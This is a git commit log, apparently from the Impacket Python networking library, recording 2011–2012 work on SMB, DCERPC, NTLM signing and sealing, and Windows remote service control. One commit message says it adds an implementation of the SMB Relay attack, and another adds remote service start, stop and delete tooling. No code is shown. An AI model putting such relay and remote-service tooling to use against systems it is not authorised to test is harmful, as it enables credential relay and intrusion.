commit 44e06db64aa1881c2228a5a8be69d950c3a8ac20
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 26 13:22:26 2012 +0000

    Sometime the difference between bytesNeeded and the actual packet is less than 6, it's safer to go just for len(ans)

commit b594ba55562acb7fed3ad49ac4a147fef5ceb62a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 24 18:38:42 2012 +0000

    CONFIG option finished

commit a18479949db001252395a4232f7da0991c462a96
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 24 18:38:14 2012 +0000

    Added QueryServiceConfigW(), should work now.. testing needed.

commit e4638262d85e3e2f0e5a23811e08a68f4010c876
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 23 00:47:43 2012 +0000

    Added CONFIG option. Not yet functional, just used for triggering and debugging QueryServiceConfigW()

commit a1b9eccec6d5dbd21a7e6e8d65b35f3efd040044
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 23 00:30:26 2012 +0000

    More on QueryServiceConfigW().. still a lot of work to do.

commit 066d2fea0b9e9564e4f4da84547b81c6a9430b12
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jan 22 23:18:51 2012 +0000

    Initial version of QueryServiceConfigW.. It parses well the response data, except the QUERY_SERVICE_CONFIGW structure. Not yet ready for use

commit 09f522823ffa381764334b7ee3ccfd0a1d1e267a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 21 22:29:08 2012 +0000

    1) Added SVCCTLRQueryServiceStatus and QueryServiceStatus from Bernardo patches
    2) Fixed wrong StartServiceW opnum number from Bernardo patches
    3) Some work pending on StartServiceW handling arguments

commit fd639af8ce97f7ae56a4098db0c67c857a5116b2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 21 22:21:43 2012 +0000

    Added STATUS option

commit fe6d3957a0a159b099a29dfea151f5f3a3cfb418
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 21 22:11:40 2012 +0000

    Ok... more on EnumServices:
    1) StringsOffset does not belong to SVCCTLServiceStatus
    2) BytesNeeded was in the wrong position within SVCCTLREnumServicesStatusWResponse
    3) The returned buffer contains TWO pointers to the strings DisplayName and ServiceName

commit 8ade7964491f46abb6f27ec5483bb7e3db73300b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 20 20:07:33 2012 +0000

    Fixed bug in EnumServicesStatusW().. Figure out previous DontKnow field is actually the offset within the packet where the service's string is hold.

commit d36ea1de33324039c1e01d3a7f054776131f2ee5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 20 18:37:20 2012 +0000

    Merging Bernardo fix for services.py

commit 54668a8ba512a8c7baada71cf51c0b0409eed50d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 20 18:33:25 2012 +0000

    Merging fixes by Bernardo... StopService() now returns SVCCTLServiceStatus.

commit 610d0d200e1fd092e19c72d01cc7c5c17a341cf7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 19 22:28:06 2012 +0000

    1. DCE Fragmentation reassembly added to recv()
    2. Added checks to ask the upper layer for more bytes in case we haven't received a full RPC Packet (especially important for TCP/UDP transports)

commit ad4cb4896a7bfb72695336c268ef340ce6bcfe9b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 19 22:26:32 2012 +0000

    Added the ability to LIST services... just specify a random servicename...

commit 68e30891ebc28a92375b183ac5d11d3e94142121
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 19 21:34:23 2012 +0000

    Adding an option to recv to request 'count' amount of bytes. Especially important for TCP transports where we cannot know how many bytes we're receiving

commit 819096c7b0fe9cb7fd393d09509932dd9c42f8bd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 19 16:58:59 2012 +0000

    Second round for EnumServicesStatus().. it's now functional, but requires DCERPC reassembly

commit 811ff57d633b01b13c6d014f22d6eb3421c51da7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 18 20:34:26 2012 +0000

    Adding an option to transport.recv() to keep asking for packets.. needed if we need to reassembly fragmented RPC

commit 6a47304a3eb59ef2af247d11766d211f9f9bbe15
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 17 22:20:50 2012 +0000

    First round of EnumServicesStatus().. not yet functional.. gotta figure the packet out..

commit 9650b60e8ada4b4141092b22d79b8207f9120418
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 17 19:55:01 2012 +0000

    Fixed padding issue on WINREGOpenKey

commit 6df23f5f54abc2ae3b3494f2c9e6c32b381009ac
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 3 15:07:44 2012 +0000

    For backward compatibility, when no server_name or domain we will return '' instead of None

commit 9ea71ed53154e47466536b7747a479d927429963
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 26 22:56:16 2011 +0000

    If *SMBSERVER is sent as remote_name, we will try to get the remote NETBIOS name(via a getnodestatus) to help succeed the connection. If unsuccesful, we go with*SMBSERVER and hope for the best

commit 8e93819290d9d1d1d4b371dd30d0d84f948dbf5a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 26 22:55:02 2011 +0000

    timeout variable wrongly passed to the underlying NetBIOS layer

commit fd0285a615693077a2ae105bd8cf102cf1b9eb90
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 26 22:51:37 2011 +0000

    Fixed wrong padding calculation on a BindACK packet after the secondary address answer

commit 84656f1fad43c2e7107367f14cb6c33c3a2aef55
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 26 22:50:14 2011 +0000

    Removed since it has been replaced the old dcerpc.py

commit a46b751075de7737e99a39c9d9fe5b4c5ff6c580
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 26 20:04:24 2011 +0000

    Removing bogus test credentials :-|

commit 941269eeb02531ae6270846441bffd74d0f90426
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 26 20:03:24 2011 +0000

    Adjusted to work with latest dcerpc.py

commit 3840a4393ac93fa61ab2336913c1ce18f5b22f94
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 26 19:30:37 2011 +0000

    A basic implementation of the SMB Relay attack first published by cDc

commit fae2eaa80c2ff2c4cf66eaf7a06bd7bc595b10b4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 26 19:18:10 2011 +0000

    SMB Server example

commit a82203d1a25905ce736b0d80f5bc737454b0a493
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 26 18:29:13 2011 +0000

    A basic SMB Server implementation in Python

commit 22fbf53c239f3efc4ab74aa4ead09452ac2ae99b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 26 18:12:07 2011 +0000

    Using the new DCERPC.py library from now on.. supporting all flavors of NTLM (including fragmentation and encryption).
    This update BREAKS backward compatibility with the old dcerpc.py

commit 612a245c4bbb615bbad65663001b63fc332d5b23
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 26 18:09:55 2011 +0000

    Reverting previous commit and going back to revision r428.

commit 5a095bd87576872804a2288ab2e3f5912069f76a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 26 18:06:02 2011 +0000

    Reverting previous commit and going back to revision r428.

commit e4dc6ca3e090b681b6abc02579ea007ed700c680
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 26 17:56:50 2011 +0000

    an SMB Server implementation in python

commit 1982fc10440104ca78c15b92ca372a792a7a45d8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 23 21:31:41 2011 +0000

    Fixed alter_ctx handling. It wasn't honoring the right ctx when issuing the next bind call.

commit 1f9b1c0239ffd0fb1df18a070e4a44b515081066
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 22 21:15:17 2011 +0000

    Building an old MSRPCHeader() for backward compatibility

commit 27286086447143d0d24b2ec76ae79b4748d3b46e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 22 21:08:01 2011 +0000

    Leaving MSRPC_NOTAFRAG flag for backward compatibility

commit 7adefefcbceb6c53aa490d7f91743c37c8ec58e7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 22 12:18:06 2011 +0000

    RawCall class now belongs to this file

commit 5c8327672666d1e9136280fc9316fdc4f792f127
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 19 20:25:36 2011 +0000

    Improved get_server_name() and get_server_domain(). It now gets the info regardless of successful logon

commit 9e353a0eaf3b9577b3da08d38752bb6d71f97e86
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 15 22:16:30 2011 +0000

    Due to different dialects interpretation of MaxRawSize, we're limiting it to 0xffff

commit b073736474fb6fd7c0c1cb241e65a9b31f2ab99f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 15 19:23:19 2011 +0000

    Don't break login method if hashes are sent in binary form.

commit ced703fcac8daa349597d1054c127b4790bbe1e2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 14 20:00:36 2011 +0000

    fix in uuid import forcing it to use the impacket one.

commit 9e5c9ece19837a1fdee0af5571ba66dedcf00771
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 4 19:57:22 2011 +0000

    1) Fix a bug when bogus_binds was selected (lack of a tuple)
    2) Now the bogus_binds UUIDs are randomly generated

commit aa24cdc737717404f90eaac4ce67b7ef0e4f64ed
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 4 12:34:31 2011 +0000

    A better way to solve the Deprecation warning issue in structure.

commit a1c557fb97f81b4ab28d7c9a4e3fdfabfe2dda5e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 4 03:24:32 2011 +0000

    Fixes the 'DeprecationWarning: struct integer overflow masking is deprecated'
    error produced calling to id().
    More important now that python aborts when such error happens.

commit 2a47ee73bdc9af8ed4b3cb6bed9adfc01a50cc04
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 4 02:54:30 2011 +0000

    Fixed MSRPC packets __init__() when initializing structs with receiving data

commit d321dbb664b1fe576522b1ff387662327bb62c5e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 3 23:10:04 2011 +0000

    Added NetprNameCanonicalize() call

commit cce536b773f6a7136293f4a827507bc6003d2a83
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 3 22:46:30 2011 +0000

    Added NetrRemoteTOD() call

commit c39b6c4693fd5c56a4582de775a5406488f15b12
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 20 21:40:09 2011 +0000

    isValidAnswer should check if the error received is a NT one

commit 25f37aa73fc16921b8db4a36a681d6680eaaecd1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 20 21:34:15 2011 +0000

    Fixed list_path so it now:
    1) Reassemblies transactions
    2) If FIND_FIRST doesn't return all the data, call FIND_NEXT

commit 695e1404d51b68535fb9c2ba9d92f8509e94fa7a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Oct 5 20:12:53 2011 +0000

    dcerpc/dcerpc missing in the import sections, making some methods to fail

commit bdaa265cf5ee47022518d71420177e78f0bdd455
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Sep 30 18:22:40 2011 +0000

    If ServerName not available when logging in, set it as Unavailable

commit 9a87a5be79348727b19056a29746bd073d151921
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Sep 30 18:09:52 2011 +0000

    Storing server's information before sending the AUTH package

commit 075edfacf82f04a06f70265df0b25df6140ae70a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Sep 30 17:59:27 2011 +0000

    If we created the SMB connection, we close it, otherwise that's up for the caller

commit 7058c2d9aa546d1896123659cdfeb7c39b166071
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Sep 28 23:18:52 2011 +0000

    Lowering connect timeouts to 10 seconds

commit 9f80410c2c3a35b51e1cabf6621d8cd4b04186d9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Sep 28 23:16:22 2011 +0000

    Replace debug stuff in signSMB with original code

commit 64f84b7b07dd35353f1e89517959a5dad47e5a3f
Author: pditincho@gmail.com <pditincho@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Sep 8 21:15:21 2011 +0000

    Addition of support for scoped addresses. Addition of test case for scoped addresses.

commit 2371d945ade3d210553d3d76e27ab5ba0f2aaae1
Author: pditincho@gmail.com <pditincho@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Sep 8 21:02:29 2011 +0000

    Bugfix - Constructor of IP6_Address now accepts a unicode string as a text representation, apart from just a regular string.

commit c6d0dccedae2911cf9bdc99ca48be859dc289d01
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Aug 12 18:29:38 2011 +0000

    1. Added flags and packet types according to the standard
    2. InterfaceId is gonne, now we handle the uuids using uuid lib
    3. Added more rejection error codes
    4. Fix typo on SupportedVersions MSRPCBindNack struct
    5. Fix not checking reject reasons for bogus binds

commit ddf962fc7e0a5531388411aa9c5efc2374bb7e94
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 27 21:41:33 2011 +0000

    Remove the self._uid if the login was unsuccessful so we can try another login in the same existing connection

commit 13d082eabcd5221bd8140f28c78d64a178408512
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 27 00:49:32 2011 +0000

    Typo :)

commit ff25c78aa9823f38cd02346c713f99a44814e249
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 27 00:46:37 2011 +0000

    1. Fixups imports
    2. SVCCTLRespDeleteServiceHeader should be based on ImpactPacket.Header

commit e9968ab3e92c3c2e97e0200b02d4bd4591f53441
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 25 22:15:32 2011 +0000

    New dcerpc structures.
    1. All packets are Structures (no more ImpactPacket)
    2. Support SIGN/SEAL for all NTLM flavors
    3. Fixed bugs on fragmentation, now should work fine
    4. Fixed bugs on bogus_binds (doesn't throw error for the bogus binds)
    
    If you want to use this, overwrite the current dcerpc.py with this one.
    
    After further testing i'm replacing current dcerpc.py with this version.

commit 9ecb66eb02b43938886d643a2b3578b21f06befd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 25 19:57:38 2011 +0000

    Fixed the testcase with the new parameters to SEAL and SIGN

commit cad13332e6383535f464f1d8011e2958209239f7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 25 19:22:09 2011 +0000

    The special case for anonymous login was taken outside KXKEY.

commit a347c8992f898f3c59ac4d4df2f16d603e1bd582
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 25 19:11:29 2011 +0000

    1. Changed SEAL parameters, we need two instances of the packet, since encrypt and sign for NTLMv2 uses different information
    2. Special case in KXKEY when no password is set

commit 23f42eba04fbcf9ff80085662983cd1651974ede
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 25 02:42:08 2011 +0000

    Flags are maintained all over the session

commit 97a89e6ee430d1cb7e3fa28de716aa7e42a21281
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 23 19:26:10 2011 +0000

    Changes on the tests. The tests are actually giving OK results

commit 9cb0f1c55f11e750dcd202121ce90d1da3034acc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 23 19:25:32 2011 +0000

    More changes to SEAL/SIGN.. still not used and still not working (it only works on NTLMv1)

commit 00ba16dfcc3d142d387d644b4bd53c146895145b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 22 16:23:23 2011 +0000

    Check and report Bind errors except for the bogus ones

commit 5d91ed204df1814fe4a9217af1b871ebd5893ab7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 21 20:36:08 2011 +0000

    Small example to start/stop/delete remote services via svcctl

commit e5a2a308fdecdd3128d5c7012842e8acf5ad6409
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 21 20:29:46 2011 +0000

    Fixed typo in ACCESS_DENIED

commit c8b90a528dd363536dbf0cae22901a0c9cf64f64
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 19 19:30:07 2011 +0000

    OpenServiceA function added

commit 11a1db04bb96c9967f6559977c99161e073e3551
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 19 19:18:06 2011 +0000

    Changed 'w' for NDRString*W to make it easier to use. *W() functions expect unicode data

commit 65399eb5c22f9d575cf809a738bd91e674582778
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 19 19:16:58 2011 +0000

    NDRStringW and NDRUniqueStringW structures added

commit f9c0dc81b620f0444ba84ad155291e4c075c595e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 19 15:13:15 2011 +0000

    Removed checking for error in doRequest.. that's up for the client

commit 4d522e77e873212e3c836835a106c64fccdce744
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 19 14:05:00 2011 +0000

    SERVICE_INTERACTIVE_PROCESS flag added to CreateServiceW

commit 2bbc6ee6bd7d514b6bbbd6ec7bfb3905b0cbcdb5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 19 14:00:14 2011 +0000

    Added SVCCTL CloseServiceHandle(), OpenSCManagerW(), CreateServiceW(), StartServiceW(), OpenServiceW(), StopService() and DeleteService().
    Similar functionality was already in place, but now all with Structure (plus fixes some bugs).

commit 0bed17270e8963cecf7f53e7a2ec9fb542783c36
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jul 17 23:12:05 2011 +0000

    SHARED_DISK_HIDDEN type added

commit 89d4f53e287bebdd18d014a64059866fedd4be3f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jul 17 22:25:48 2011 +0000

    default port changed to 445
    increase timeout to 10 seconds

commit 5c96547e6fda093623ebf5a4e9d9b97d2a6f7df3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jul 17 17:39:56 2011 +0000

    Added isGuestSession() method.

commit ab8fb8a56dfe365e6ce49ed67c3273cb2cf6fa73
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 15 23:51:39 2011 +0000

    Added get_encryption_key() method

commit 8ef53d95f1bf71800e4a14183ad44bd7db13b054
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 15 18:42:58 2011 +0000

    Fixed NTLMAuthChallenge in the situation I sent TargetInfoFields not as a structure but just as pure data

commit ba643c0a4190e241284ad572a26a96758d9b29ca
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 13 21:17:30 2011 +0000

    TRANS2_SET_PATH_INFORMATION structure added

commit 2a7a537a1c4635a5e79e5031de356a5d06af9898
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 12 23:16:15 2011 +0000

    Fix in SessionSetup structure to be able to unpack it

commit 267633f25d61f4399973b3d1d7a318daeb6d29c6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 12 16:44:54 2011 +0000

    NetShareInfo structs added, for later use of list_shared()

commit 9ce99b85e62986e3c5609fa1d64219fb4e2edd3c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 12 13:38:24 2011 +0000

    Added Transaction_SData structure

commit 28658628b8fb55072a62897de48c0d20b901dc13
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 12 12:08:35 2011 +0000

    SMB_QUERY_FILE_EA_INFO structure added

commit 96f9507e6039ad20bc83f3785b85c01a2b00c509
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 12 00:44:34 2011 +0000

    Added SMB_SET_FILE_BASIC_INFO and SMB_SET_FILE_END_OF_FILE_INFO structures

commit 8647dd74c9cc328c6951fc39b6cdebf21562c0fe
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 9 21:54:07 2011 +0000

    Added TRANS2_FIND_NEXT2 and SMB_COM_TRANSACTION2_SECONDARY structs

commit 68093fcc22a51aedfa0c98f96b07d9aa2c44b788
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 9 00:04:22 2011 +0000

    Changed *Time fileds for CreateAndXParameters to 'q' size

commit 87b3471cca4c2cbcf0e08be743312eff6942844a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 7 17:37:04 2011 +0000

    TRANS2_SET_FILE_INFORMATION structures added.

commit 5e55c844cdd65caeb170f94cf858cfede19273f1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 7 15:36:29 2011 +0000

    SMB_COM_DELETE and SMB_COM_DELETE_DIRECTORY structures added

commit 39bd64942a2eaa424f7165bbfb084c55c7eefb50
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 7 13:26:51 2011 +0000

    Fix typo for smb.FILE_SUPERSEDE

commit 4ff68ca41698372a84a9b7f7dbca461494202c25
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 6 16:23:17 2011 +0000

    1. SMBWrite and SMBWriteAndX structures

commit 42aea7797cfa7bc8743842a7957c9b2e885e61f7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 5 22:28:01 2011 +0000

    1. More structures added, no functionality changed

commit 97e3bc463c2da534e5f09c0ab5ce56225f9db371
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 5 02:13:41 2011 +0000

    1. Added SMBReadAndX_Parameters2 structure

commit c1a18064572ddd85b6064f9dea89dd68d9f73670
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 5 00:55:54 2011 +0000

    1. Added structures for SMB_COM_QUERY_INFORMATION2 (0x23)

commit 988e3b5ec5f4b866bfbdbd0cce4ecece55ac70ea
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 4 20:55:37 2011 +0000

    1. Added constants and structures for various transaction functions

commit e29f3ada2a03872d87902023d1c2bd30d5ab37b0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 4 00:51:18 2011 +0000

    1. Added SMB_FILE_ATTRIBUTES
    2. Added QUERY_INFORMATION levels
    3. File System Attributes
    4. QUERY_FS Information Levels
    5. SMB_COM_QUERY_INFORMATION

commit 613b3c71c737a5eabcf1f3a65c6267c57fe0f08e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jul 3 20:20:48 2011 +0000

    Structures added:
    1. SMBTreeConnectAndXResponse_Parameters
    2. SMBTreeConnectAndXResponse_Data
    3. SMB_COM_TRANSACTION2
    4. SMB_COM_ECHO
    
    SMB_COM_LOGOFF flags

commit 4cc88d332266c57083de3229d2a08cd4e1cd8949
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 2 19:09:09 2011 +0000

    Comment for TREE_CONNECT_ANDX

commit 521d30f9805b9f4ad63a0b4e3d1517a78dba10e3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 2 18:55:53 2011 +0000

    Added support to parse SPNEGO structures if acting as a server

commit 9c46f8b4d515a4c649b3333bf3786a23fa2a4d43
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 2 18:55:20 2011 +0000

    1. Version and MIC now handled in NTLMChallengeResponse
    2. NTLMChallengeResponse.fromString() now work as expected

commit 65b58a498afa49613db2a917b1484d3bea0cdb13
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 2 00:00:56 2011 +0000

    NetBIOSTcpSession also accepts connections already established

commit b0a20ceea688f22996a0cd6dde20a4c3216cc1a2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 2 00:00:10 2011 +0000

    SPNEGO now decodes MechTokens if available

commit c42ef0d35b129550a6441d8fe65e00096780abff
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 1 23:59:02 2011 +0000

    AuthChallenge.getData() wasn't returning any data ;)

commit 9b57d86b7d9ad2e54ac79527fe8ac72ebcfefd69
